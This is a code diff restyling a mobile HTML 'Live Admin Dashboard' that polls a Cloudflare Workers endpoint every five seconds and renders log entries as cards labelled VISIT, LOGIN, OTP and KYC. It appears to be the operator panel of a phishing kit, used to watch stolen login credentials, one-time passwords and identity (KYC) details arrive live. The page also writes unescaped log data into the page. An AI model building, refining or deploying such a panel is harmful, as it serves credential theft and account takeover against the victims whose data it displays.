@@ -3,142 +3,138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Live Dashboard</title>
+    <title>Live Admin Dashboard</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
-        body { background-color: #f8f9fa; padding-bottom: 50px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background-color: #f0f2f5; padding-bottom: 40px; }
 
-        /* Premium Header */
+        /* Sticky Header */
         .header {
-            background: #315195;
-            color: white;
-            padding: 18px 20px;
+            background: #ffffff;
+            padding: 15px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             position: sticky;
             top: 0;
             z-index: 1000;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
         }
-        .header h1 { font-size: 18px; font-weight: 600; }
+        .header h1 { font-size: 18px; color: #315195; font-weight: 700; }
         
-        /* Visit Count Pulse */
-        .count-badge {
-            background: rgba(255,255,255,0.2);
-            padding: 4px 14px;
-            border-radius: 50px;
-            font-weight: 800;
-            font-size: 16px;
-            border: 1px solid rgba(255,255,255,0.3);
+        /* Visit Count Bubble */
+        .visit-badge {
+            background: #315195;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 14px;
         }
 
-        .container { padding: 12px; display: flex; flex-direction: column; gap: 10px; }
+        .container { padding: 12px; display: flex; flex-direction: column; gap: 12px; }
 
         /* Vertical Colourful Cards */
         .card {
-            background: #fff;
+            background: #ffffff;
             border-radius: 12px;
-            padding: 15px;
+            padding: 16px;
             box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
             border-left: 6px solid #ccc;
-            animation: slideUp 0.4s ease;
+            animation: fadeIn 0.4s ease-out;
         }
 
-        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Logic Colours */
-        .card-visit { border-left-color: #315195; background: #f0f3ff; }
-        .card-login { border-left-color: #28a745; background: #f1fff5; }
-        .card-otp   { border-left-color: #fd7e14; background: #fff9f2; }
-        .card-kyc   { border-left-color: #e83e8c; background: #fff2f8; }
+        /* Dynamic Colors Based on Data Type */
+        .card-visit { border-left-color: #315195; background: #f0f4ff; }
+        .card-login { border-left-color: #28a745; background: #f1fff4; }
+        .card-otp   { border-left-color: #ff9800; background: #fffcf0; }
+        .card-kyc   { border-left-color: #e91e63; background: #fff0f5; }
 
-        .card-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 2px; }
-        .tag { font-size: 10px; font-weight: 800; text-transform: uppercase; color: #666; }
-        .time { font-size: 10px; color: #aaa; font-weight: 500; }
-        .detail { font-size: 15px; color: #1a1a1a; font-weight: 700; line-height: 1.4; word-break: break-all; }
+        .card-header { display: flex; justify-content: space-between; margin-bottom: 8px; }
+        .tag { font-size: 11px; font-weight: 800; text-transform: uppercase; color: #555; }
+        .time { font-size: 10px; color: #999; }
 
-        /* Bottom Live Pulse */
-        .status-bar {
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-            background: #fff;
-            padding: 8px;
-            text-align: center;
-            font-size: 11px;
-            color: #666;
-            border-top: 1px solid #eee;
-            font-weight: 600;
+        /* Detailed Data View (Multi-line Support) */
+        .detail-box { 
+            font-size: 16px; 
+            color: #111; 
+            font-weight: 600; 
+            line-height: 1.6; 
+            white-space: pre-wrap; /* Yeh zaroori hai line change ke liye */
+            word-break: break-all;
         }
-        .dot { height: 8px; width: 8px; background: #28a745; border-radius: 50%; display: inline-block; margin-right: 5px; animation: blink 1.2s infinite; }
+
+        /* Live Status Dot */
+        .live-status { text-align: center; margin-top: 15px; font-size: 11px; color: #666; }
+        .dot { height: 8px; width: 8px; background: #28a745; border-radius: 50%; display: inline-block; margin-right: 5px; animation: blink 1.5s infinite; }
         @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <h1>Live Monitoring</h1>
-        <div class="count-badge" id="vCount">0</div>
+        <h1>LIVE LOGS</h1>
+        <div class="visit-badge" id="totalVisits">0</div>
     </div>
 
-    <div class="container" id="logsBox">
+    <div class="container" id="logsContainer">
         </div>
 
-    <div class="status-bar">
-        <span class="dot"></span> Live Sync Active (5s)
+    <div class="live-status">
+        <span class="dot"></span> Updating automatically...
     </div>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
 
-        async function refreshData() {
+        async function fetchLogs() {
             try {
-                const res = await fetch(workerURL);
-                const data = await res.json();
+                const response = await fetch(workerURL);
+                const data = await response.json();
                 
-                const box = document.getElementById('logsBox');
-                const count = document.getElementById('vCount');
+                const container = document.getElementById('logsContainer');
+                const visitDisplay = document.getElementById('totalVisits');
 
                 if (!data || data.length === 0) {
-                    box.innerHTML = "<p style='text-align:center;color:#ccc;margin-top:50px;'>No logs recorded</p>";
+                    container.innerHTML = "<p style='text-align:center; padding:40px; color:#999;'>No data found</p>";
                     return;
                 }
 
-                // Visit Count Logic
-                const totalV = data.filter(l => String(l.type).toUpperCase().includes("VISIT")).length;
-                count.innerText = totalV;
+                // Total Visit Counting
+                const visits = data.filter(l => String(l.type).toUpperCase().includes("VISIT")).length;
+                visitDisplay.innerText = visits;
 
-                // Render Cards (Newest on Top)
-                box.innerHTML = data.map(log => {
-                    let cStyle = "";
+                // Render Logs (Newest on Top)
+                container.innerHTML = data.map(log => {
+                    let cardClass = "";
                     const type = String(log.type).toUpperCase();
 
-                    if(type.includes("VISIT")) cStyle = "card-visit";
-                    else if(type.includes("LOGIN")) cStyle = "card-login";
-                    else if(type.includes("OTP")) cStyle = "card-otp";
-                    else if(type.includes("KYC")) cStyle = "card-kyc";
+                    if(type.includes("VISIT")) cardClass = "card-visit";
+                    else if(type.includes("LOGIN")) cardClass = "card-login";
+                    else if(type.includes("OTP")) cardClass = "card-otp";
+                    else if(type.includes("KYC")) cardClass = "card-kyc";
 
                     return `
-                        <div class="card ${cStyle}">
-                            <div class="card-top">
+                        <div class="card ${cardClass}">
+                            <div class="card-header">
                                 <span class="tag">${log.type}</span>
                                 <span class="time">${log.time}</span>
                             </div>
-                            <div class="detail">${log.detail}</div>
+                            <div class="detail-box">${log.detail.replace(/<br>/g, '\n')}</div>
                         </div>
                     `;
                 }).join('');
 
-            } catch (e) { console.log("Sync..."); }
+            } catch (err) {
+                console.log("Sync error...");
+            }
         }
 
-        // Auto Refresh 5 Seconds
-        setInterval(refreshData, 5000);
-        window.onload = refreshData;
+        // Auto Refresh logic (5 seconds)
+        setInterval(fetchLogs, 5000);
+        window.onload = fetchLogs;
     </script>
 </body>
 </html>
